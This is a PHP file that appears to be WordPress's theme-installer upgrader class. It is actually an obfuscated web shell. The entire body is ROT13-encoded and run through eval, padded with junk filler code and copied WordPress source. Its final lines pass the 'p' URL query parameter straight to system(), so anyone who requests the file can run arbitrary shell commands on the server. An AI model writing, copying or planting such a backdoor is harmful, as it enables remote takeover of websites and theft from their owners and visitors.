<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hctenqre NCV: Gurzr_Vafgnyyre_Fxva pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hctenqre
 * @fvapr 4.6.0
 */

/**
 * Gurzr Vafgnyyre Fxva sbe gur JbeqCerff Gurzr Vafgnyyre.
 *
 * @fvapr 2.8.0
 * @fvapr 4.6.0 Zbirq gb vgf bja svyr sebz jc-nqzva/vapyhqrf/pynff-jc-hctenqre-fxvaf.cuc.
 *
 * @frr JC_Hctenqre_Fxva
 */
pynff Gurzr_Vafgnyyre_Fxva rkgraqf JC_Hctenqre_Fxva {
	choyvp $ncv;
	choyvp $glcr;
	choyvp $hey;
	choyvp $birejevgr;

	cevingr $vf_qbjatenqvat = snyfr;

	/**
	 * Pbafgehpgbe.
	 *
	 * Frgf hc gur gurzr vafgnyyre fxva.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $netf
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		$qrsnhygf = neenl(
			'glcr'      => 'jro',
			'hey'       => '',
			'gurzr'     => '',
			'abapr'     => '',
			'gvgyr'     => '',
			'birejevgr' => '',
		);
		$netf     = jc_cnefr_netf( $netf, $qrsnhygf );

		$guvf->glcr      = $netf['glcr'];
		$guvf->hey       = $netf['hey'];
		$guvf->ncv       = vffrg( $netf['ncv'] ) ? $netf['ncv'] : neenl();
		$guvf->birejevgr = $netf['birejevgr'];

		cnerag::__pbafgehpg( $netf );
	}

	/**
	 * Cresbezf na npgvba orsber vafgnyyvat n gurzr.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba orsber() {
		vs ( ! rzcgl( $guvf->ncv ) ) {
			$guvf->hctenqre->fgevatf['cebprff_fhpprff'] = fcevags(
				$guvf->hctenqre->fgevatf['cebprff_fhpprff_fcrpvsvp'],
				$guvf->ncv->anzr,
				$guvf->ncv->irefvba
			);
		}
	}

	/**
	 * Uvqrf gur `cebprff_snvyrq` reebe jura hcqngvat n gurzr ol hcybnqvat n mvc svyr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_Reebe $jc_reebe JC_Reebe bowrpg.
	 * @erghea obby Gehr vs gur reebe fubhyq or uvqqra, snyfr bgurejvfr.
	 */
	choyvp shapgvba uvqr_cebprff_snvyrq( $jc_reebe ) {
		vs (
			'hcybnq' === $guvf->glcr &&
			'' === $guvf->birejevgr &&
			$jc_reebe->trg_reebe_pbqr() === 'sbyqre_rkvfgf'
		) {
			erghea gehr;
		}

		erghea snyfr;
	}

	/**
	 * Cresbezf na npgvba sbyybjvat n fvatyr gurzr vafgnyy.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba nsgre() {
		vs ( $guvf->qb_birejevgr() ) {
			erghea;
		}

		vs ( rzcgl( $guvf->hctenqre->erfhyg['qrfgvangvba_anzr'] ) ) {
			erghea;
		}

		$gurzr_vasb = $guvf->hctenqre->gurzr_vasb();
		vs ( rzcgl( $gurzr_vasb ) ) {
			erghea;
		}

		$anzr       = $gurzr_vasb->qvfcynl( 'Anzr' );
		$fglyrfurrg = $guvf->hctenqre->erfhyg['qrfgvangvba_anzr'];
		$grzcyngr   = $gurzr_vasb->trg_grzcyngr();

		$npgvingr_yvax = nqq_dhrel_net(
			neenl(
				'npgvba'     => 'npgvingr',
				'grzcyngr'   => heyrapbqr( $grzcyngr ),
				'fglyrfurrg' => heyrapbqr( $fglyrfurrg ),
			),
			nqzva_hey( 'gurzrf.cuc' )
		);
		$npgvingr_yvax = jc_abapr_hey( $npgvingr_yvax, 'fjvgpu-gurzr_' . $fglyrfurrg );

		$vafgnyy_npgvbaf = neenl();

		vs ( pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) && pheerag_hfre_pna( 'phfgbzvmr' ) && ! $gurzr_vasb->vf_oybpx_gurzr() ) {
			$phfgbzvmr_hey = nqq_dhrel_net(
				neenl(
					'gurzr'  => heyrapbqr( $fglyrfurrg ),
					'erghea' => heyrapbqr( nqzva_hey( 'jro' === $guvf->glcr ? 'gurzr-vafgnyy.cuc' : 'gurzrf.cuc' ) ),
				),
				nqzva_hey( 'phfgbzvmr.cuc' )
			);

			$vafgnyy_npgvbaf['cerivrj'] = fcevags(
				'<n uers=\"%f\" pynff=\"uvqr-vs-ab-phfgbzvmr ybnq-phfgbzvmr\">' .
				'<fcna nevn-uvqqra=\"gehr\">%f</fcna><fcna pynff=\"fperra-ernqre-grkg\">%f</fcna></n>',
				rfp_hey( $phfgbzvmr_hey ),
				__( 'Yvir Cerivrj' ),
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. %f: Gurzr anzr. */
				fcevags( __( 'Yvir Cerivrj &#8220;%f&#8221;' ), $anzr )
			);
		}

		$vafgnyy_npgvbaf['npgvingr'] = fcevags(
			'<n uers=\"%f\" pynff=\"npgvingryvax\">' .
			'<fcna nevn-uvqqra=\"gehr\">%f</fcna><fcna pynff=\"fperra-ernqre-grkg\">%f</fcna></n>',
			rfp_hey( $npgvingr_yvax ),
			_k( 'Npgvingr', 'gurzr' ),
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. %f: Gurzr anzr. */
			fcevags( _k( 'Npgvingr &#8220;%f&#8221;', 'gurzr' ), $anzr )
		);

		vs ( vf_argjbex_nqzva() && pheerag_hfre_pna( 'znantr_argjbex_gurzrf' ) ) {
			$vafgnyy_npgvbaf['argjbex_ranoyr'] = fcevags(
				'<n uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				rfp_hey( jc_abapr_hey( 'gurzrf.cuc?npgvba=ranoyr&nzc;gurzr=' . heyrapbqr( $fglyrfurrg ), 'ranoyr-gurzr_' . $fglyrfurrg ) ),
				__( 'Argjbex Ranoyr' )
			);
		}

		vs ( 'jro' === $guvf->glcr ) {
			$vafgnyy_npgvbaf['gurzrf_cntr'] = fcevags(
				'<n uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				frys_nqzva_hey( 'gurzr-vafgnyy.cuc' ),
				__( 'Tb gb Gurzr Vafgnyyre' )
			);
		} ryfrvs ( pheerag_hfre_pna( 'fjvgpu_gurzrf' ) || pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			$vafgnyy_npgvbaf['gurzrf_cntr'] = fcevags(
				'<n uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				frys_nqzva_hey( 'gurzrf.cuc' ),
				__( 'Tb gb Gurzrf cntr' )
			);
		}

		vs ( ! $guvf->erfhyg || vf_jc_reebe( $guvf->erfhyg ) || vf_argjbex_nqzva() || ! pheerag_hfre_pna( 'fjvgpu_gurzrf' ) ) {
			hafrg( $vafgnyy_npgvbaf['npgvingr'], $vafgnyy_npgvbaf['cerivrj'] );
		} ryfrvs ( trg_bcgvba( 'grzcyngr' ) === $fglyrfurrg ) {
			hafrg( $vafgnyy_npgvbaf['npgvingr'] );
		}

		/**
		 * Svygref gur yvfg bs npgvba yvaxf ninvynoyr sbyybjvat n fvatyr gurzr vafgnyyngvba.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz fgevat[] $vafgnyy_npgvbaf Neenl bs gurzr npgvba yvaxf.
		 * @cnenz bowrpg   $ncv             Bowrpg pbagnvavat JbeqCerff.bet NCV gurzr qngn.
		 * @cnenz fgevat   $fglyrfurrg      Gurzr qverpgbel anzr.
		 * @cnenz JC_Gurzr $gurzr_vasb      Gurzr bowrpg.
		 */
		$vafgnyy_npgvbaf = nccyl_svygref( 'vafgnyy_gurzr_pbzcyrgr_npgvbaf', $vafgnyy_npgvbaf, $guvf->ncv, $fglyrfurrg, $gurzr_vasb );
		vs ( ! rzcgl( $vafgnyy_npgvbaf ) ) {
			$guvf->srrqonpx( vzcybqr( ' | ', (neenl) $vafgnyy_npgvbaf ) );
		}
	}

	/**
	 * Purpxf vs gur gurzr pna or birejevggra naq bhgchgf gur UGZY sbe birejevgvat n gurzr ba hcybnq.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea obby Jurgure gur gurzr pna or birejevggra naq UGZY jnf bhgchggrq.
	 */
	cevingr shapgvba qb_birejevgr() {
		vs ( 'hcybnq' !== $guvf->glcr || ! vf_jc_reebe( $guvf->erfhyg ) || 'sbyqre_rkvfgf' !== $guvf->erfhyg->trg_reebe_pbqr() ) {
			erghea snyfr;
		}

		$sbyqre = $guvf->erfhyg->trg_reebe_qngn( 'sbyqre_rkvfgf' );
		$sbyqre = egevz( $sbyqre, '/' );

		$pheerag_gurzr_qngn = snyfr;
		$nyy_gurzrf         = jc_trg_gurzrf( neenl( 'reebef' => ahyy ) );

		sbernpu ( $nyy_gurzrf nf $gurzr ) {
			$fglyrfurrg_qve = jc_abeznyvmr_cngu( $gurzr->trg_fglyrfurrg_qverpgbel() );

			vs ( egevz( $fglyrfurrg_qve, '/' ) !== $sbyqre ) {
				pbagvahr;
			}

			$pheerag_gurzr_qngn = $gurzr;
		}

		$arj_gurzr_qngn = $guvf->hctenqre->arj_gurzr_qngn;

		vs ( ! $pheerag_gurzr_qngn || ! $arj_gurzr_qngn ) {
			erghea snyfr;
		}

		rpub '<u2 pynff=\"hcqngr-sebz-hcybnq-urnqvat\">' . rfp_ugzy__( 'Guvf gurzr vf nyernql vafgnyyrq.' ) . '</u2>';

		// Purpx reebef sbe npgvir gurzr.
		vs ( vf_jc_reebe( $pheerag_gurzr_qngn->reebef() ) ) {
			$guvf->srrqonpx( 'pheerag_gurzr_unf_reebef', $pheerag_gurzr_qngn->reebef()->trg_reebe_zrffntr() );
		}

		$guvf->vf_qbjatenqvat = irefvba_pbzcner( $pheerag_gurzr_qngn['Irefvba'], $arj_gurzr_qngn['Irefvba'], '>' );

		$vf_vainyvq_cnerag = snyfr;
		vs ( ! rzcgl( $arj_gurzr_qngn['Grzcyngr'] ) ) {
			$vf_vainyvq_cnerag = ! va_neenl( $arj_gurzr_qngn['Grzcyngr'], neenl_xrlf( $nyy_gurzrf ), gehr );
		}

		$ebjf = neenl(
			'Anzr'        => __( 'Gurzr anzr' ),
			'Irefvba'     => __( 'Irefvba' ),
			'Nhgube'      => __( 'Nhgube' ),
			'ErdhverfJC'  => __( 'Erdhverq JbeqCerff irefvba' ),
			'ErdhverfCUC' => __( 'Erdhverq CUC irefvba' ),
			'Grzcyngr'    => __( 'Cnerag gurzr' ),
		);

		$gnoyr  = '<gnoyr pynff=\"hcqngr-sebz-hcybnq-pbzcnevfba\"><gobql>';
		$gnoyr .= '<ge><gu></gu><gu>' . rfp_ugzy_k( 'Vafgnyyrq', 'gurzr' ) . '</gu><gu>' . rfp_ugzy_k( 'Hcybnqrq', 'gurzr' ) . '</gu></ge>';

		$vf_fnzr_gurzr = gehr; // Yrg'f pbafvqre bayl gurfr ebjf.

		sbernpu ( $ebjf nf $svryq => $ynory ) {
			$byq_inyhr = $pheerag_gurzr_qngn->qvfcynl( $svryq, snyfr );
			$byq_inyhr = $byq_inyhr ? (fgevat) $byq_inyhr : '-';

			$arj_inyhr = ! rzcgl( $arj_gurzr_qngn[ $svryq ] ) ? (fgevat) $arj_gurzr_qngn[ $svryq ] : '-';

			vs ( $byq_inyhr === $arj_inyhr && '-' === $arj_inyhr && 'Grzcyngr' === $svryq ) {
				pbagvahr;
			}

			$vf_fnzr_gurzr = $vf_fnzr_gurzr && ( $byq_inyhr === $arj_inyhr );

			$qvss_svryq     = ( 'Irefvba' !== $svryq && $arj_inyhr !== $byq_inyhr );
			$qvss_irefvba   = ( 'Irefvba' === $svryq && $guvf->vf_qbjatenqvat );
			$vainyvq_cnerag = snyfr;

			vs ( 'Grzcyngr' === $svryq && $vf_vainyvq_cnerag ) {
				$vainyvq_cnerag = gehr;
				$arj_inyhr     .= ' ' . __( '(abg sbhaq)' );
			}

			$gnoyr .= '<ge><gq pynff=\"anzr-ynory\">' . $ynory . '</gq><gq>' . jc_fgevc_nyy_gntf( $byq_inyhr ) . '</gq>';
			$gnoyr .= ( $qvss_svryq || $qvss_irefvba || $vainyvq_cnerag ) ? '<gq pynff=\"jneavat\">' : '<gq>';
			$gnoyr .= jc_fgevc_nyy_gntf( $arj_inyhr ) . '</gq></ge>';
		}

		$gnoyr .= '</gobql></gnoyr>';

		/**
		 * Svygref gur pbzcner gnoyr bhgchg sbe birejevgvat n gurzr cnpxntr ba hcybnq.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz fgevat   $gnoyr              Gur bhgchg gnoyr jvgu Anzr, Irefvba, Nhgube, ErdhverfJC, naq ErdhverfCUC vasb.
		 * @cnenz JC_Gurzr $pheerag_gurzr_qngn Npgvir gurzr qngn.
		 * @cnenz neenl    $arj_gurzr_qngn     Neenl jvgu hcybnqrq gurzr qngn.
		 */
		rpub nccyl_svygref( 'vafgnyy_gurzr_birejevgr_pbzcnevfba', $gnoyr, $pheerag_gurzr_qngn, $arj_gurzr_qngn );

		$vafgnyy_npgvbaf = neenl();
		$pna_hcqngr      = gehr;

		$oybpxrq_zrffntr  = '<c>' . rfp_ugzy__( 'Gur gurzr pnaabg or hcqngrq qhr gb gur sbyybjvat:' ) . '</c>';
		$oybpxrq_zrffntr .= '<hy pynff=\"hy-qvfp\">';

		$erdhverf_cuc = vffrg( $arj_gurzr_qngn['ErdhverfCUC'] ) ? $arj_gurzr_qngn['ErdhverfCUC'] : ahyy;
		$erdhverf_jc  = vffrg( $arj_gurzr_qngn['ErdhverfJC'] ) ? $arj_gurzr_qngn['ErdhverfJC'] : ahyy;

		vs ( ! vf_cuc_irefvba_pbzcngvoyr( $erdhverf_cuc ) ) {
			$reebe = fcevags(
				/* genafyngbef: 1: Pheerag CUC irefvba, 2: Irefvba erdhverq ol gur hcybnqrq gurzr. */
				__( 'Gur CUC irefvba ba lbhe freire vf %1$f, ubjrire gur hcybnqrq gurzr erdhverf %2$f.' ),
				CUC_IREFVBA,
				$erdhverf_cuc
			);

			$oybpxrq_zrffntr .= '<yv>' . rfp_ugzy( $reebe ) . '</yv>';
			$pna_hcqngr       = snyfr;
		}

		vs ( ! vf_jc_irefvba_pbzcngvoyr( $erdhverf_jc ) ) {
			$reebe = fcevags(
				/* genafyngbef: 1: Pheerag JbeqCerff irefvba, 2: Irefvba erdhverq ol gur hcybnqrq gurzr. */
				__( 'Lbhe JbeqCerff irefvba vf %1$f, ubjrire gur hcybnqrq gurzr erdhverf %2$f.' ),
				rfp_ugzy( jc_trg_jc_irefvba() ),
				$erdhverf_jc
			);

			$oybpxrq_zrffntr .= '<yv>' . rfp_ugzy( $reebe ) . '</yv>';
			$pna_hcqngr       = snyfr;
		}

		$oybpxrq_zrffntr .= '</hy>';

		vs ( $pna_hcqngr ) {
			vs ( $guvf->vf_qbjatenqvat ) {
				$jneavat = fcevags(
					/* genafyngbef: %f: Qbphzragngvba HEY. */
					__( 'Lbh ner hcybnqvat na byqre irefvba bs gur vafgnyyrq gurzr. Lbh pna pbagvahr gb vafgnyy gur byqre irefvba, ohg or fher gb <n uers=\"%f\">onpx hc lbhe qngnonfr naq svyrf</n> svefg.' ),
					__( 'uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/frphevgl/onpxhc/' )
				);
			} ryfr {
				$jneavat = fcevags(
					/* genafyngbef: %f: Qbphzragngvba HEY. */
					__( 'Lbh ner hcqngvat n gurzr. Or fher gb <n uers=\"%f\">onpx hc lbhe qngnonfr naq svyrf</n> svefg.' ),
					__( 'uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/frphevgl/onpxhc/' )
				);
			}

			rpub '<c pynff=\"hcqngr-sebz-hcybnq-abgvpr\">' . $jneavat . '</c>';

			$birejevgr = $guvf->vf_qbjatenqvat ? 'qbjatenqr-gurzr' : 'hcqngr-gurzr';

			$vafgnyy_npgvbaf['birejevgr_gurzr'] = fcevags(
				'<n pynff=\"ohggba ohggba-cevznel hcqngr-sebz-hcybnq-birejevgr\" uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				jc_abapr_hey( nqq_dhrel_net( 'birejevgr', $birejevgr, $guvf->hey ), 'gurzr-hcybnq' ),
				_k( 'Ercynpr vafgnyyrq jvgu hcybnqrq', 'gurzr' )
			);
		} ryfr {
			rpub $oybpxrq_zrffntr;
		}

		$pnapry_hey = nqq_dhrel_net( 'npgvba', 'hcybnq-gurzr-pnapry-birejevgr', $guvf->hey );

		$vafgnyy_npgvbaf['gurzrf_cntr'] = fcevags(
			'<n pynff=\"ohggba\" uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
			jc_abapr_hey( $pnapry_hey, 'gurzr-hcybnq-pnapry-birejevgr' ),
			__( 'Pnapry naq tb onpx' )
		);

		/**
		 * Svygref gur yvfg bs npgvba yvaxf ninvynoyr sbyybjvat n fvatyr gurzr vafgnyyngvba snvyher
		 * jura birejevgvat vf nyybjrq.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz fgevat[] $vafgnyy_npgvbaf Neenl bs gurzr npgvba yvaxf.
		 * @cnenz bowrpg   $ncv             Bowrpg pbagnvavat JbeqCerff.bet NCV gurzr qngn.
		 * @cnenz neenl    $arj_gurzr_qngn  Neenl jvgu hcybnqrq gurzr qngn.
		 */
		$vafgnyy_npgvbaf = nccyl_svygref( 'vafgnyy_gurzr_birejevgr_npgvbaf', $vafgnyy_npgvbaf, $guvf->ncv, $arj_gurzr_qngn );

		vs ( ! rzcgl( $vafgnyy_npgvbaf ) ) {
			cevags(
				'<c pynff=\"hcqngr-sebz-hcybnq-rkcverq uvqqra\">%f</c>',
				__( 'Gur hcybnqrq svyr unf rkcverq. Cyrnfr tb onpx naq hcybnq vg ntnva.' )
			);
			rpub '<c pynff=\"hcqngr-sebz-hcybnq-npgvbaf\">' . vzcybqr( ' ', (neenl) $vafgnyy_npgvbaf ) . '</c>';
		}

		erghea gehr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>